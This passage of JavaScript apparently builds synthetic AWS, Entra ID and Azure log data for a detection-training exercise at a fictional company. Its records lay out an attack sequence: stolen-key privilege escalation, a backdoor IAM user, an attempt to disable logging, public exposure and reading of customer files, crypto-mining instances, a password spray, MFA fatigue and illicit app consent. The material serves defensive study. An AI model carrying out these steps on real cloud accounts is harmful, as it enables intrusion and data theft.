    ct('2026-10-26 22:10:15', 'signin.amazonaws.com', 'ConsoleLogin', ACCT_NONPROD, 'us-east-1', OFFICE_EGRESS[0], CONSOLE, { type: 'AssumedRole', principalId: `AROAEXAMPLEDEV:j.halpert@${DOMAIN}`, arn: `arn:aws:sts::${ACCT_NONPROD}:assumed-role/AWSReservedSSO_Developer_a1b2c3d4e5f6a7b8/j.halpert@${DOMAIN}`, accountId: ACCT_NONPROD }, null, { ConsoleLogin: 'Success' }, { additionalEventData: JSON.stringify({ MFAUsed: 'Yes', MobileVersion: 'No', LoginTo: 'https://console.aws.amazon.com/' }) }),
    // the stolen svc-deploy key, used from Germany in a region Acme Life never uses
    ct('2026-10-26 09:20:14', 'sts.amazonaws.com', 'GetCallerIdentity', ACCT_PROD, 'eu-central-1', ATK_KEYS, AWSCLI, ident.svcDeploy(), null, null),
    ct('2026-10-26 09:20:31', 'iam.amazonaws.com', 'ListUsers', ACCT_PROD, 'eu-central-1', ATK_KEYS, AWSCLI, ident.svcDeploy(), null, null),
    ct('2026-10-26 09:20:48', 'iam.amazonaws.com', 'ListAttachedUserPolicies', ACCT_PROD, 'eu-central-1', ATK_KEYS, AWSCLI, ident.svcDeploy(), { userName: 'svc-deploy' }, null),
    ct('2026-10-26 09:21:05', 'iam.amazonaws.com', 'CreateAccessKey', ACCT_PROD, 'eu-central-1', ATK_KEYS, AWSCLI, ident.svcDeploy(), { userName: 'svc-deploy' }, { accessKey: { accessKeyId: 'AKIAEXAMPLE9ZZNEW01', status: 'Active', userName: 'svc-deploy' } }),
    ct('2026-10-26 09:21:40', 'iam.amazonaws.com', 'AttachUserPolicy', ACCT_PROD, 'eu-central-1', ATK_KEYS, AWSCLI, ident.svcDeploy(), { userName: 'svc-deploy', policyArn: 'arn:aws:iam::aws:policy/AdministratorAccess' }, null),
    ct('2026-10-26 09:22:03', 'iam.amazonaws.com', 'CreateUser', ACCT_PROD, 'eu-central-1', ATK_KEYS, AWSCLI, ident.svcDeploy(), { userName: 'backup-admin' }, { user: { userName: 'backup-admin', arn: `arn:aws:iam::${ACCT_PROD}:user/backup-admin` } }),
    ct('2026-10-26 09:22:20', 'iam.amazonaws.com', 'CreateLoginProfile', ACCT_PROD, 'eu-central-1', ATK_KEYS, AWSCLI, ident.svcDeploy(), { userName: 'backup-admin', passwordResetRequired: false }, null),
    ct('2026-10-26 09:23:55', 'cloudtrail.amazonaws.com', 'StopLogging', ACCT_PROD, SYD, ATK_KEYS, AWSCLI, ident.svcDeploy(), { name: `arn:aws:cloudtrail:${SYD}:${ACCT_PROD}:trail/acme-org-trail` }, null, { errorCode: 'AccessDenied', errorMessage: 'User: arn:aws:iam::111122223333:user/svc-deploy is not authorized to perform: cloudtrail:StopLogging on resource: arn:aws:cloudtrail:ap-southeast-2:111122223333:trail/acme-org-trail with an explicit deny in a service control policy' }),
    ct('2026-10-26 09:24:30', 's3.amazonaws.com', 'ListBuckets', ACCT_PROD, 'eu-central-1', ATK_KEYS, AWSCLI, ident.svcDeploy(), null, null),
    ct('2026-10-26 09:25:12', 's3.amazonaws.com', 'PutBucketPolicy', ACCT_PROD, SYD, ATK_KEYS, AWSCLI, ident.svcDeploy(), { bucketName: 'acme-policyadmin-prod-exports', bucketPolicy: { Statement: [{ Effect: 'Allow', Principal: '*', Action: 's3:GetObject' }] } }, null),
    ct('2026-10-26 09:26:01', 's3.amazonaws.com', 'GetObject', ACCT_PROD, SYD, ATK_KEYS, AWSCLI, ident.svcDeploy(), { bucketName: 'acme-policyadmin-prod-exports', key: 'customers/policy_holders_full.csv' }, null, { eventCategory: 'Data', managementEvent: false }),
    ct('2026-10-26 09:26:44', 's3.amazonaws.com', 'GetObject', ACCT_PROD, SYD, ATK_KEYS, AWSCLI, ident.svcDeploy(), { bucketName: 'acme-policyadmin-prod-exports', key: 'customers/beneficiaries.csv' }, null, { eventCategory: 'Data', managementEvent: false }),
    ct('2026-10-26 09:30:10', 'ec2.amazonaws.com', 'RunInstances', ACCT_PROD, 'eu-central-1', ATK_KEYS, AWSCLI, ident.svcDeploy(), { instanceType: 'p3.8xlarge', instancesSet: { items: [{ imageId: 'ami-0abcdef1234567890', minCount: 4, maxCount: 4 }] } }, { instancesSet: { items: [{ instanceId: 'i-0f00ba4e7c9d1a2b3' }, { instanceId: 'i-0f00ba4e7c9d1a2b4' }, { instanceId: 'i-0f00ba4e7c9d1a2b5' }, { instanceId: 'i-0f00ba4e7c9d1a2b6' }] } }),
    ct('2026-10-26 09:31:02', 'ec2.amazonaws.com', 'AuthorizeSecurityGroupIngress', ACCT_PROD, 'eu-central-1', ATK_KEYS, AWSCLI, ident.svcDeploy(), { groupId: 'sg-0e1f2a3b4c5d6e7f8', ipPermissions: { items: [{ ipProtocol: 'tcp', fromPort: 22, toPort: 22, ipRanges: { items: [{ cidrIp: '0.0.0.0/0' }] } }] } }, null),
    // root console login attempts, then success
    ct('2026-10-26 09:40:12', 'signin.amazonaws.com', 'ConsoleLogin', ACCT_PROD, 'us-east-1', ATK_KEYS, CONSOLE, ident.root(), null, { ConsoleLogin: 'Failure' }, { errorMessage: 'Failed authentication', additionalEventData: JSON.stringify({ MFAUsed: 'No', LoginTo: 'https://console.aws.amazon.com/' }) }),
    ct('2026-10-26 09:40:58', 'signin.amazonaws.com', 'ConsoleLogin', ACCT_PROD, 'us-east-1', ATK_KEYS, CONSOLE, ident.root(), null, { ConsoleLogin: 'Failure' }, { errorMessage: 'Failed authentication', additionalEventData: JSON.stringify({ MFAUsed: 'No', LoginTo: 'https://console.aws.amazon.com/' }) }),
    ct('2026-10-26 09:41:33', 'signin.amazonaws.com', 'ConsoleLogin', ACCT_PROD, 'us-east-1', ATK_KEYS, CONSOLE, ident.root(), null, { ConsoleLogin: 'Failure' }, { errorMessage: 'Failed authentication', additionalEventData: JSON.stringify({ MFAUsed: 'No', LoginTo: 'https://console.aws.amazon.com/' }) }),
    ct('2026-10-26 09:43:05', 'signin.amazonaws.com', 'ConsoleLogin', ACCT_PROD, 'us-east-1', ATK_KEYS, CONSOLE, ident.root(), null, { ConsoleLogin: 'Success' }, { additionalEventData: JSON.stringify({ MFAUsed: 'No', LoginTo: 'https://console.aws.amazon.com/' }) }),
    ct('2026-10-26 09:44:20', 'iam.amazonaws.com', 'DeleteAccessKey', ACCT_PROD, 'us-east-1', ATK_KEYS, CONSOLE, ident.root(), { userName: 'svc-deploy', accessKeyId: 'AKIAEXAMPLE5TJ3Q9LD' }, null),
    // the response: CyberOps rotates and locks down
    ct('2026-10-26 10:15:40', 'iam.amazonaws.com', 'UpdateAccessKey', ACCT_PROD, SYD, OFFICE_EGRESS[1], CONSOLE, ident.sso(`d.schrute@${DOMAIN}`, ACCT_PROD, 'CyberOps'), { userName: 'svc-deploy', accessKeyId: 'AKIAEXAMPLE9ZZNEW01', status: 'Inactive' }, null),
    ct('2026-10-26 10:16:05', 'iam.amazonaws.com', 'DetachUserPolicy', ACCT_PROD, SYD, OFFICE_EGRESS[1], CONSOLE, ident.sso(`d.schrute@${DOMAIN}`, ACCT_PROD, 'CyberOps'), { userName: 'svc-deploy', policyArn: 'arn:aws:iam::aws:policy/AdministratorAccess' }, null),
    ct('2026-10-26 10:17:30', 'iam.amazonaws.com', 'DeleteUser', ACCT_PROD, SYD, OFFICE_EGRESS[1], CONSOLE, ident.sso(`d.schrute@${DOMAIN}`, ACCT_PROD, 'CyberOps'), { userName: 'backup-admin' }, null),
    ct('2026-10-26 10:18:12', 'ec2.amazonaws.com', 'TerminateInstances', ACCT_PROD, 'eu-central-1', OFFICE_EGRESS[1], CONSOLE, ident.sso(`d.schrute@${DOMAIN}`, ACCT_PROD, 'CyberOps'), { instancesSet: { items: [{ instanceId: 'i-0f00ba4e7c9d1a2b3' }, { instanceId: 'i-0f00ba4e7c9d1a2b4' }, { instanceId: 'i-0f00ba4e7c9d1a2b5' }, { instanceId: 'i-0f00ba4e7c9d1a2b6' }] } }, null),
    ct('2026-10-26 10:19:00', 's3.amazonaws.com', 'DeleteBucketPolicy', ACCT_PROD, SYD, OFFICE_EGRESS[1], CONSOLE, ident.sso(`d.schrute@${DOMAIN}`, ACCT_PROD, 'CyberOps'), { bucketName: 'acme-policyadmin-prod-exports' }, null),
  ];
  // VPC flow logs from the core perimeter VPC: the scanner hits the ALB; the ALB's replies look like outbound traffic
  const ENI_ALB = 'eni-0f1e2d3c4b5a6978', ENI_APP = 'eni-0a9b8c7d6e5f4321', VPC = 'vpc-0c0ffee1234abcd56';
  const fl = (time, eni, src, sport, dst, dport, pkts, bytes, action, dir, dur) => { const start = Math.floor(XQL.parseTimeString(time) / 1000); return Object.assign(blank(AWS_COLUMNS), { _time: T(time), _log_type: 'flowlogs', account_id: ACCT_PROD, interface_id: eni, srcaddr: src, dstaddr: dst, srcport: sport, dstport: dport, protocol: 6, packets: pkts, bytes, start, end: start + (dur || 30), action, log_status: 'OK', flow_direction: dir, pkt_srcaddr: src, pkt_dstaddr: dst, vpc_id: VPC, _product: 'AWS', _vendor: 'Amazon' }); };
  const FLOW_ROWS = [];
  // the same six scanner connections that the threat log and the network_story mirror rows describe
  const scanPorts = [51514, 51520, 51533, 51602, 51640, 51688];
  const scanTimes = ['2026-10-23 10:40:02', '2026-10-23 10:40:09', '2026-10-23 10:41:30', '2026-10-23 11:10:44', '2026-10-23 10:44:04', '2026-10-23 10:45:05'];
  const scanReq = [1840, 2210, 1960, 2480, 2320, 2440], scanRep = [920, 1180, 970, 3310, 1160, 1220];
  scanPorts.forEach((p, i) => {
    FLOW_ROWS.push(fl(scanTimes[i], ENI_ALB, ATK_SCAN, p, ALB, 443, 14, scanReq[i], 'ACCEPT', 'ingress'));
    FLOW_ROWS.push(fl(scanTimes[i], ENI_ALB, ALB, 443, ATK_SCAN, p, 11, scanRep[i], 'ACCEPT', 'egress'));
  });
  FLOW_ROWS.push(fl('2026-10-23 10:52:10', ENI_ALB, ATK_SCAN, 51701, ALB, 22, 1, 44, 'REJECT', 'ingress'));
  FLOW_ROWS.push(fl('2026-10-23 10:52:14', ENI_ALB, ATK_SCAN, 51702, ALB, 3389, 1, 44, 'REJECT', 'ingress'));
  FLOW_ROWS.push(fl('2026-10-23 10:41:31', ENI_APP, ALB, 48811, APP, 8080, 12, 2210, 'ACCEPT', 'ingress'));
  FLOW_ROWS.push(fl('2026-10-23 10:41:31', ENI_APP, APP, 8080, ALB, 48811, 10, 3310, 'ACCEPT', 'egress'));
  FLOW_ROWS.push(fl('2026-10-24 09:15:12', ENI_APP, APP, 44312, '13.224.1.7', 443, 9, 1200, 'ACCEPT', 'egress', 60));
  FLOW_ROWS.push(fl('2026-10-24 09:15:12', ENI_APP, '13.224.1.7', 443, APP, 44312, 38, 48200, 'ACCEPT', 'ingress', 60));
  FLOW_ROWS.push(fl('2026-10-26 02:00:05', ENI_ALB, '198.51.100.146', 60211, ALB, 443, 120, 15200, 'ACCEPT', 'ingress', 120));
  FLOW_ROWS.push(fl('2026-10-26 02:00:05', ENI_ALB, ALB, 443, '198.51.100.146', 60211, 310, 402100, 'ACCEPT', 'egress', 120));
  FLOW_ROWS.push(fl('2026-10-26 09:33:40', 'eni-0bad1dea5c0ffee99', '10.240.70.5', 50010, '192.0.2.45', 443, 2200, 318000000, 'ACCEPT', 'egress', 600));
  FLOW_ROWS.push(fl('2026-10-26 09:33:40', 'eni-0bad1dea5c0ffee99', '192.0.2.45', 443, '10.240.70.5', 50010, 640, 51000, 'ACCEPT', 'ingress', 600));
  const AWS_ROWS = CT_ROWS.concat(FLOW_ROWS).sort((a, b) => Number(a._time) - Number(b._time));

  // ---- msft_azure_ad_raw: Entra ID sign-in logs ------------------------------------------------------------------
  const ENTRA_COLUMNS = ['_time', 'createdDateTime', 'category', 'userPrincipalName', 'userDisplayName', 'userId', 'userType', 'appDisplayName', 'appId', 'resourceDisplayName', 'ipAddress', 'clientAppUsed', 'authenticationRequirement', 'conditionalAccessStatus', 'isInteractive', 'riskLevelDuringSignIn', 'riskState', 'riskDetail', 'status', 'location', 'deviceDetail', 'mfaDetail', 'servicePrincipalName', 'correlationId', '_product', '_vendor'];
  const PEOPLE = { 's.hudson': ['Stanley Hudson', 'u-1001'], 'p.beesly': ['Pam Beesly', 'u-1002'], 'j.halpert': ['Jim Halpert', 'u-1003'], 'd.schrute': ['Dwight Schrute', 'u-1004'], 'a.martin': ['Angela Martin', 'u-1005'], 'it-admin': ['IT Admin', 'u-0001'] };
  let corr = 7000;
  const si = (time, user, app, ip, loc, dev, status, opts) => {
    const [name, id] = PEOPLE[user] || [user, 'u-9999'];
    const o = Object.assign({ _time: T(time), createdDateTime: time.replace(' ', 'T') + 'Z', category: 'SignInLogs', userPrincipalName: `${user}@${DOMAIN}`, userDisplayName: name, userId: id, userType: 'Member', appDisplayName: app, appId: app === 'Office 365 Exchange Online' ? '00000002-0000-0ff1-ce00-000000000000' : app === 'Azure Portal' ? 'c44b4083-3bb0-49c1-b47d-974e53cbdf3c' : app === 'My Apps' ? '2793995e-0a7d-40d7-bd35-6968ba142197' : 'e9f2c1b0-1111-4a2b-9c3d-abcdef012345', resourceDisplayName: app === 'Office 365 Exchange Online' ? 'Office 365 Exchange Online' : app === 'Azure Portal' ? 'Windows Azure Service Management API' : 'Microsoft Graph', ipAddress: ip, clientAppUsed: 'Browser', authenticationRequirement: 'multiFactorAuthentication', conditionalAccessStatus: 'success', isInteractive: true, riskLevelDuringSignIn: 'none', riskState: 'none', riskDetail: 'none', status: JSON.stringify(status), location: JSON.stringify(loc), deviceDetail: JSON.stringify(dev), mfaDetail: JSON.stringify({ authMethod: 'Microsoft Authenticator app notification' }), servicePrincipalName: null, correlationId: `c0r-${corr++}`, _product: 'AzureAD', _vendor: 'msft' }, opts || {});
    return o;
  };
  const OK = { errorCode: 0, failureReason: 'Other.', additionalDetails: 'MFA requirement satisfied by claim in the token' };
  const BADPW = { errorCode: 50126, failureReason: 'Error validating credentials due to invalid username or password.', additionalDetails: null };
  const MFADENY = { errorCode: 500121, failureReason: 'Authentication failed during strong authentication request.', additionalDetails: 'MFA denied; user declined the authentication' };
  const LOCKED = { errorCode: 50053, failureReason: 'Account is locked because user tried to sign in too many times with an incorrect user ID or password.', additionalDetails: null };
  const CA_BLOCK = { errorCode: 53003, failureReason: 'Access has been blocked by Conditional Access policies. The access policy does not allow token issuance.', additionalDetails: null };
  const LOC_MEL = { city: 'Melbourne', state: 'Victoria', countryOrRegion: 'AU' }, LOC_SYD = { city: 'Sydney', state: 'New South Wales', countryOrRegion: 'AU' }, LOC_LAG = { city: 'Lagos', state: 'Lagos', countryOrRegion: 'NG' }, LOC_SHA = { city: 'Shanghai', state: 'Shanghai', countryOrRegion: 'CN' };
  const dev = (name, os, browser, compliant, managed) => ({ deviceId: name ? `dev-${name.toLowerCase()}` : '', displayName: name || '', operatingSystem: os, browser, isCompliant: compliant, isManaged: managed, trustType: managed ? 'Hybrid Azure AD joined' : '' });
  const ENTRA_ROWS = [
    si('2026-10-26 08:50:15', 's.hudson', 'Office 365 Exchange Online', OFFICE_EGRESS[0], LOC_MEL, dev('WS-FIN-042', 'Windows 11', 'Edge 130.0.0', true, true), OK),
    si('2026-10-26 09:58:33', 'p.beesly', 'Office 365 Exchange Online', OFFICE_EGRESS[0], LOC_MEL, dev('WS-HR-017', 'Windows 11', 'Edge 130.0.0', true, true), OK),
    si('2026-10-26 10:02:10', 'p.beesly', 'Microsoft Teams', OFFICE_EGRESS[1], LOC_MEL, dev('WS-HR-017', 'Windows 11', 'Edge 130.0.0', true, true), OK),
    si('2026-10-26 07:07:02', 'j.halpert', 'Office 365 Exchange Online', VPN_EGRESS, LOC_SYD, dev('WS-SALES-023', 'Windows 11', 'Edge 130.0.0', true, true), OK),
    si('2026-10-25 08:11:00', 'p.beesly', 'Microsoft Teams', VPN_EGRESS, LOC_MEL, dev('WS-HR-017', 'Windows 11', 'Edge 130.0.0', true, true), OK),
    si('2026-10-26 13:38:44', 'd.schrute', 'Azure Portal', OFFICE_EGRESS[1], LOC_MEL, dev('LAPTOP-SEC-09', 'Windows 11', 'Edge 130.0.0', true, true), OK),
    si('2026-10-26 13:39:30', 'd.schrute', 'Snowflake', OFFICE_EGRESS[1], LOC_MEL, dev('LAPTOP-SEC-09', 'Windows 11', 'Edge 130.0.0', true, true), OK),
    si('2026-10-27 06:46:10', 'd.schrute', 'Office 365 Exchange Online', VPN_EGRESS, LOC_MEL, dev('LAPTOP-SEC-09', 'Windows 11', 'Edge 130.0.0', true, true), OK),
    si('2026-10-26 15:28:00', 'a.martin', 'Office 365 Exchange Online', OFFICE_EGRESS[0], LOC_MEL, dev('MAC-DESIGN-03', 'MacOs', 'Safari 18.0', true, true), OK),
    // password spray against s.hudson from Lagos, then a success that Conditional Access did not stop
    si('2026-10-26 19:41:05', 's.hudson', 'Office 365 Exchange Online', ATK_SPRAY, LOC_LAG, dev('', 'Windows 10', 'Chrome 129.0.0', false, false), BADPW, { authenticationRequirement: 'singleFactorAuthentication', conditionalAccessStatus: 'notApplied', riskLevelDuringSignIn: 'medium', riskState: 'atRisk', riskDetail: 'none', mfaDetail: null }),
    si('2026-10-26 19:41:22', 's.hudson', 'Office 365 Exchange Online', ATK_SPRAY, LOC_LAG, dev('', 'Windows 10', 'Chrome 129.0.0', false, false), BADPW, { authenticationRequirement: 'singleFactorAuthentication', conditionalAccessStatus: 'notApplied', riskLevelDuringSignIn: 'medium', riskState: 'atRisk', riskDetail: 'none', mfaDetail: null }),
    si('2026-10-26 19:41:50', 's.hudson', 'Office 365 Exchange Online', ATK_SPRAY, LOC_LAG, dev('', 'Windows 10', 'Chrome 129.0.0', false, false), BADPW, { authenticationRequirement: 'singleFactorAuthentication', conditionalAccessStatus: 'notApplied', riskLevelDuringSignIn: 'medium', riskState: 'atRisk', riskDetail: 'none', mfaDetail: null }),
    si('2026-10-26 19:42:18', 's.hudson', 'Office 365 Exchange Online', ATK_SPRAY, LOC_LAG, dev('', 'Windows 10', 'Chrome 129.0.0', false, false), BADPW, { authenticationRequirement: 'singleFactorAuthentication', conditionalAccessStatus: 'notApplied', riskLevelDuringSignIn: 'medium', riskState: 'atRisk', riskDetail: 'none', mfaDetail: null }),
    si('2026-10-26 19:43:01', 's.hudson', 'Office 365 Exchange Online', ATK_SPRAY, LOC_LAG, dev('', 'Windows 10', 'Chrome 129.0.0', false, false), MFADENY, { conditionalAccessStatus: 'success', riskLevelDuringSignIn: 'high', riskState: 'atRisk', riskDetail: 'none', mfaDetail: JSON.stringify({ authMethod: 'Microsoft Authenticator app notification' }) }),
    si('2026-10-26 19:52:40', 's.hudson', 'Office 365 Exchange Online', ATK_SPRAY, LOC_LAG, dev('', 'Windows 10', 'Chrome 129.0.0', false, false), MFADENY, { conditionalAccessStatus: 'success', riskLevelDuringSignIn: 'high', riskState: 'atRisk', riskDetail: 'none', mfaDetail: JSON.stringify({ authMethod: 'Microsoft Authenticator app notification' }) }),
    si('2026-10-26 20:10:55', 's.hudson', 'Office 365 Exchange Online', ATK_SPRAY, LOC_LAG, dev('', 'Windows 10', 'Chrome 129.0.0', false, false), OK, { conditionalAccessStatus: 'success', riskLevelDuringSignIn: 'high', riskState: 'atRisk', riskDetail: 'none', mfaDetail: JSON.stringify({ authMethod: 'Microsoft Authenticator app notification' }) }),
    si('2026-10-26 20:15:30', 's.hudson', 'My Apps', ATK_SPRAY, LOC_LAG, dev('', 'Windows 10', 'Chrome 129.0.0', false, false), OK, { isInteractive: false, category: 'NonInteractiveUserSignInLogs', riskLevelDuringSignIn: 'high', riskState: 'atRisk', mfaDetail: null }),
    // legacy authentication attempts from Shanghai, blocked by Conditional Access
    si('2026-10-24 22:38:10', 'administrator', 'Office 365 Exchange Online', ATK_LEGACY, LOC_SHA, dev('', 'Windows 10', 'Other', false, false), BADPW, { clientAppUsed: 'Exchange ActiveSync', authenticationRequirement: 'singleFactorAuthentication', conditionalAccessStatus: 'notApplied', mfaDetail: null, userDisplayName: 'Administrator', userId: 'u-0000' }),
    si('2026-10-24 22:38:40', 'administrator', 'Office 365 Exchange Online', ATK_LEGACY, LOC_SHA, dev('', 'Windows 10', 'Other', false, false), BADPW, { clientAppUsed: 'Exchange ActiveSync', authenticationRequirement: 'singleFactorAuthentication', conditionalAccessStatus: 'notApplied', mfaDetail: null, userDisplayName: 'Administrator', userId: 'u-0000' }),
    si('2026-10-24 22:39:05', 'svc_backup', 'Office 365 Exchange Online', ATK_LEGACY, LOC_SHA, dev('', 'Windows 10', 'Other', false, false), CA_BLOCK, { clientAppUsed: 'Other clients', authenticationRequirement: 'singleFactorAuthentication', conditionalAccessStatus: 'failure', mfaDetail: null, userDisplayName: 'svc_backup', userId: 'u-0500' }),
    si('2026-10-24 22:39:30', 'svc_backup', 'Office 365 Exchange Online', ATK_LEGACY, LOC_SHA, dev('', 'Windows 10', 'Other', false, false), LOCKED, { clientAppUsed: 'Other clients', authenticationRequirement: 'singleFactorAuthentication', conditionalAccessStatus: 'notApplied', mfaDetail: null, userDisplayName: 'svc_backup', userId: 'u-0500' }),
    // service principal sign-ins (Snowflake OAuth app and the Cloud Sync agent)
    si('2026-10-26 13:40:12', 'snowflake-oauth-app', 'Snowflake OAuth', '203.0.113.50', LOC_SYD, dev('', '', '', false, false), OK, { category: 'ServicePrincipalSignInLogs', userPrincipalName: null, userDisplayName: null, userId: null, userType: null, servicePrincipalName: 'snowflake-oauth-app', isInteractive: false, clientAppUsed: null, authenticationRequirement: null, conditionalAccessStatus: 'notApplied', mfaDetail: null, appId: '5f6e7d8c-2222-4b3a-8d9e-fedcba543210' }),
    si('2026-10-26 00:05:00', 'cloud-sync-agent', 'Azure AD Cloud Sync', '10.10.1.5', LOC_MEL, dev('', '', '', false, false), OK, { category: 'ServicePrincipalSignInLogs', userPrincipalName: null, userDisplayName: null, userId: null, userType: null, servicePrincipalName: 'Azure AD Cloud Sync', isInteractive: false, clientAppUsed: null, authenticationRequirement: null, conditionalAccessStatus: 'notApplied', mfaDetail: null, appId: '1a78b1e3-3333-4c4d-9e0f-0123456789ab' }),
  ].sort((a, b) => Number(a._time) - Number(b._time));

  // ---- msft_azure_ad_audit_raw: Entra ID directory audit ------------------------------------------------------------
  const AUDIT_COLUMNS = ['_time', 'activityDateTime', 'activityDisplayName', 'category', 'loggedByService', 'operationType', 'result', 'resultReason', 'initiatedBy', 'targetResources', 'correlationId', '_product', '_vendor'];
  const au = (time, name, cat, svc, op, result, by, targets, reason) => ({ _time: T(time), activityDateTime: time.replace(' ', 'T') + 'Z', activityDisplayName: name, category: cat, loggedByService: svc, operationType: op, result, resultReason: reason || '', initiatedBy: JSON.stringify(by), targetResources: JSON.stringify(targets), correlationId: `c0r-${corr++}`, _product: 'AzureAD', _vendor: 'msft' });
  const byUser = (u, ip) => ({ user: { userPrincipalName: `${u}@${DOMAIN}`, displayName: (PEOPLE[u] || [u])[0], ipAddress: ip } });
  const byApp = (name) => ({ app: { displayName: name, servicePrincipalName: name } });
  const tgtUser = (u, props) => ({ displayName: (PEOPLE[u] || [u])[0], type: 'User', userPrincipalName: `${u}@${DOMAIN}`, modifiedProperties: props || [] });
  const AUDIT_ROWS = [
    au('2026-10-24 22:16:30', 'Add member to group', 'GroupManagement', 'Core Directory', 'Assign', 'success', byUser('it-admin', OFFICE_EGRESS[0]), [{ displayName: 'SG-Finance-Reporting', type: 'Group', modifiedProperties: [{ displayName: 'Group.DisplayName', newValue: '"SG-Finance-Reporting"' }] }, tgtUser('a.martin')]),
    au('2026-10-26 10:05:12', 'Reset user password', 'UserManagement', 'Core Directory', 'Update', 'success', byUser('it-admin', OFFICE_EGRESS[0]), [tgtUser('p.beesly')]),
    au('2026-10-26 20:16:20', 'Consent to application', 'ApplicationManagement', 'Core Directory', 'Assign', 'success', byUser('s.hudson', ATK_SPRAY), [{ displayName: 'Mail Sync Pro', type: 'ServicePrincipal', modifiedProperties: [{ displayName: 'ConsentContext.IsAdminConsent', newValue: '"False"' }, { displayName: 'ConsentAction.Permissions', newValue: '"[] => [[Id: Mail.ReadWrite, Mail.Send, offline_access, User.Read]]"' }] }]),
    au('2026-10-26 20:16:21', 'Add app role assignment grant to user', 'ApplicationManagement', 'Core Directory', 'Assign', 'success', byUser('s.hudson', ATK_SPRAY), [{ displayName: 'Mail Sync Pro', type: 'ServicePrincipal', modifiedProperties: [] }, tgtUser('s.hudson')]),
    au('2026-10-26 20:18:05', 'Update user', 'UserManagement', 'Core Directory', 'Update', 'success', byApp('Mail Sync Pro'), [tgtUser('s.hudson', [{ displayName: 'StrongAuthenticationPhoneAppDetail', newValue: '[{"DeviceName":"Pixel 7"}]' }])]),
    au('2026-10-26 20:19:40', 'User registered security info', 'UserManagement', 'Authentication Methods', 'Add', 'success', byUser('s.hudson', ATK_SPRAY), [tgtUser('s.hudson', [{ displayName: 'AuthenticationMethod', newValue: '"Microsoft Authenticator (Pixel 7)"' }])]),
    au('2026-10-26 21:02:00', 'Add member to role', 'RoleManagement', 'Core Directory', 'Assign', 'success', byUser('it-admin', OFFICE_EGRESS[1]), [tgtUser('d.schrute', [{ displayName: 'Role.DisplayName', newValue: '"Security Reader"' }])]),
    au('2026-10-26 21:30:15', 'Add member to role', 'RoleManagement', 'Core Directory', 'Assign', 'success', byUser('it-admin', OFFICE_EGRESS[1]), [tgtUser('a.martin', [{ displayName: 'Role.DisplayName', newValue: '"Global Administrator"' }])]),
    au('2026-10-27 01:10:33', 'Add service principal credentials', 'ApplicationManagement', 'Core Directory', 'Update', 'success', byUser('a.martin', OFFICE_EGRESS[1]), [{ displayName: 'acme-policy-sync', type: 'ServicePrincipal', modifiedProperties: [{ displayName: 'KeyDescription', newValue: '"[KeyIdentifier=c3d4e5f6,KeyType=Password,KeyUsage=Verify,DisplayName=backdoor-key]"' }] }]),
    au('2026-10-27 01:12:00', 'Disable account', 'UserManagement', 'Core Directory', 'Update', 'success', byUser('it-admin', OFFICE_EGRESS[1]), [tgtUser('s.hudson', [{ displayName: 'AccountEnabled', newValue: '"false"' }])]),
    au('2026-10-27 01:13:30', 'Remove app role assignment from user', 'ApplicationManagement', 'Core Directory', 'Unassign', 'success', byUser('it-admin', OFFICE_EGRESS[1]), [{ displayName: 'Mail Sync Pro', type: 'ServicePrincipal', modifiedProperties: [] }, tgtUser('s.hudson')]),
    au('2026-10-25 09:00:00', 'Add user', 'UserManagement', 'Core Directory', 'Add', 'success', byUser('it-admin', OFFICE_EGRESS[0]), [tgtUser('k.malone')]),
    au('2026-10-25 09:00:30', 'Update user', 'UserManagement', 'Core Directory', 'Update', 'failure', byUser('it-admin', OFFICE_EGRESS[0]), [tgtUser('k.malone')], 'Microsoft.Online.DirectoryServices.DirectoryValueExistsException'),
  ];
  // provisioning noise from Azure AD Cloud Sync: one sync per hour touches many users
  for (let h = 0; h < 48; h += 3) {
    const t = new Date(XQL.NOW - (h + 1) * 3600000 - 120000);
    const ts = XQL.formatTime(t.getTime()).replace(' UTC', '');
    const who = ['s.hudson', 'p.beesly', 'j.halpert', 'd.schrute', 'a.martin'][h % 5];
    AUDIT_ROWS.push(au(ts, 'Update user', 'ProvisioningManagement', 'Azure AD Cloud Sync', 'Update', 'success', byApp('Azure AD Cloud Sync'), [tgtUser(who, [{ displayName: 'LastDirSyncTime', newValue: `"${ts}"` }])]));
  }
  AUDIT_ROWS.sort((a, b) => Number(a._time) - Number(b._time));

  // ---- msft_azure_raw: Azure activity logs via Event Hub ------------------------------------------------------------
  const AZ_COLUMNS = ['_time', 'time', 'operationName', 'category', 'resultType', 'resultSignature', 'callerIpAddress', 'caller', 'identity', 'resourceId', 'subscriptionId', 'resourceGroup', 'level', 'location', 'properties', 'correlationId', '_product', '_vendor'];
  const SUB = 'b2c3d4e5-1111-4f6a-8b9c-0d1e2f3a4b5c';
  const RG = 'rg-acme-policyapp-prod';
  const az = (time, op, cat, result, ip, caller, rid, props, level) => ({ _time: T(time), time: time.replace(' ', 'T') + 'Z', operationName: op, category: cat, resultType: result, resultSignature: result === 'Success' ? 'Succeeded.' : result === 'Failure' ? 'Failed.Forbidden' : 'Started.', callerIpAddress: ip, caller, identity: JSON.stringify({ authorization: { scope: rid, action: op }, claims: { upn: caller.includes('@') ? caller : undefined, appid: caller.includes('@') ? undefined : caller } }), resourceId: rid, subscriptionId: SUB, resourceGroup: RG, level: level || 'Informational', location: 'australiaeast', properties: props == null ? null : JSON.stringify(props), correlationId: `c0r-${corr++}`, _product: 'Azure', _vendor: 'msft' });
  const RID = (type, name) => `/SUBSCRIPTIONS/${SUB.toUpperCase()}/RESOURCEGROUPS/${RG.toUpperCase()}/PROVIDERS/${type}/${name}`;
  const AZ_ROWS = [
    az('2026-10-22 02:10:00', 'MICROSOFT.COMPUTE/VIRTUALMACHINES/WRITE', 'Administrative', 'Start', OFFICE_EGRESS[0], `it-admin@${DOMAIN}`, RID('MICROSOFT.COMPUTE/VIRTUALMACHINES', 'VM-POLICYAPP-PROD-01'), { statusCode: 'Accepted', serviceRequestId: 'r-1' }),
    az('2026-10-22 02:11:30', 'MICROSOFT.COMPUTE/VIRTUALMACHINES/WRITE', 'Administrative', 'Success', OFFICE_EGRESS[0], `it-admin@${DOMAIN}`, RID('MICROSOFT.COMPUTE/VIRTUALMACHINES', 'VM-POLICYAPP-PROD-01'), { statusCode: 'OK' }),
